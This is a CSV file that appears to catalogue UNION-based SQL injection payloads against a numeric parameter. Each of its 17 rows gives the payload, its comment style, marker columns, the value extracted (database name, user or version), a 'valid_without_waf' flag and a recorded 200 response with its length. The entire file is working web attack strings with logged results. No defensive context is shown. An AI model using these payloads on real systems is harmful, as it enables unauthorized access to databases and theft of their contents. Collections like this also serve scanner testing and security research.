payload_id,payload,context,columns,comment_style,marker_column_left,marker_column_right,extraction_expr,valid_without_waf,status_code,response_len,notes
p0001,"-1 UNION SELECT 'SEQSQLI_START','SEQSQLI_END'-- -",numeric,2,dash,1,2,database(),yes,200,848,
p0002,"-1 UNION SELECT 'SEQSQLI_START','SEQSQLI_END'#",numeric,2,hash,1,2,database(),yes,200,845,
p0003,"-1 UNION SELECT 'SEQSQLI_START','SEQSQLI_END'--+",numeric,2,dashplus,1,2,database(),yes,200,847,
p0004,"-1 UNION SELECT 'SEQSQLI_START','SEQSQLI_END'-- -",numeric,2,dash,1,2,user(),yes,200,848,
p0005,"-1 UNION SELECT 'SEQSQLI_START','SEQSQLI_END'#",numeric,2,hash,1,2,user(),yes,200,845,
p0006,"-1 UNION SELECT 'SEQSQLI_START','SEQSQLI_END'--+",numeric,2,dashplus,1,2,user(),yes,200,847,
p0007,"-1 UNION SELECT 'SEQSQLI_START','SEQSQLI_END'-- -",numeric,2,dash,1,2,version(),yes,200,848,
p0008,"-1 UNION SELECT 'SEQSQLI_START','SEQSQLI_END'#",numeric,2,hash,1,2,version(),yes,200,845,
p0009,"-1 UNION SELECT 'SEQSQLI_START','SEQSQLI_END'--+",numeric,2,dashplus,1,2,version(),yes,200,847,
p0010,"-1 UNION SELECT 'SEQSQLI_START',database(),'SEQSQLI_END'-- -",numeric,3,dash,1,3,database(),yes,200,859,
p0011,"-1 UNION SELECT 'SEQSQLI_START',database(),'SEQSQLI_END'#",numeric,3,hash,1,3,database(),yes,200,856,
p0012,"-1 UNION SELECT 'SEQSQLI_START',database(),'SEQSQLI_END'--+",numeric,3,dashplus,1,3,database(),yes,200,858,
p0013,"-1 UNION SELECT 'SEQSQLI_START',user(),'SEQSQLI_END'-- -",numeric,3,dash,1,3,user(),yes,200,855,
p0014,"-1 UNION SELECT 'SEQSQLI_START',user(),'SEQSQLI_END'#",numeric,3,hash,1,3,user(),yes,200,852,
p0015,"-1 UNION SELECT 'SEQSQLI_START',user(),'SEQSQLI_END'--+",numeric,3,dashplus,1,3,user(),yes,200,854,
p0016,"-1 UNION SELECT 'SEQSQLI_START',version(),'SEQSQLI_END'-- -",numeric,3,dash,1,3,version(),yes,200,858,
p0017,"-1 UNION SELECT 'SEQSQLI_START',version(),'SEQSQLI_END'#",numeric,3,hash,1,3,version(),yes,200,855,
